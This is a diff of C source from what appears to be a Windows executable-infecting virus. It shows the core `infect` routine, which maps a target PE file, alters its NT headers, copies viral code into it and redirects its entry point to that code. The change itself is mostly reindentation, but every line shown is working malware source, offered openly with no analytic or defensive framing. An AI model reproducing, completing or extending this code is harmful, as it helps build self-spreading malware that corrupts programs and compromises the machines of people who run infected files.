@@ -16,30 +16,29 @@ static int open_file_view(const char* filename, file_view_t* fileView, data_t* d
 static void close_file_view(file_view_t* fileView, data_t* data);
 
 int infect(const char* filename, data_t* data) {
-  int ret = 0;
-  if (can_infect(filename, data)) {
-    file_view_t fileView;
-    memzero(&fileView, sizeof(file_view_t));
+    int ret = 0;
+    if (can_infect(filename, data)) {
+        file_view_t fileView;
+        memzero(&fileView, sizeof(file_view_t));
 
-    uint32_t extendedSize = get_extended_file_size(filename, data);
-    fileView.size = extendedSize;
-    if (open_file_view(filename, &fileView, data) == 0){
-      IMAGE_NT_HEADERS* ntHeaders = get_nt_header(fileView.startAddress);
+        uint32_t extendedSize = get_extended_file_size(filename, data);
+        fileView.size = extendedSize;
+        if (open_file_view(filename, &fileView, data) == 0){
+            IMAGE_NT_HEADERS* ntHeaders = get_nt_header(fileView.startAddress);
+            modify_headers(ntHeaders, data->codeSize);
+            void* targetCodeBegin = copy_code(ntHeaders, &fileView, data);
+            modify_entrypoint(ntHeaders, data->entryOffset, targetCodeBegin);
 
-      modify_headers(ntHeaders, data->codeSize);
-      void* targetCodeBegin = copy_code(ntHeaders, &fileView, data);
-      modify_entrypoint(ntHeaders, data->entryOffset, targetCodeBegin);
-
-      data->functions.flushViewOfFile(fileView.startAddress, extendedSize);
-      
-      close_file_view(&fileView, data);
+            data->functions.flushViewOfFile(fileView.startAddress, extendedSize);
+            
+            close_file_view(&fileView, data);
+        } else {
+            ret = 1;
+        }
     } else {
-      ret = 1;
+        ret = 2;
     }
-  } else {
-    ret = 2;
-  }
-  return ret;
+    return ret;
 }
 
 static void modify_headers(IMAGE_NT_HEADERS* ntHeaders, uint32_t codeSize) {
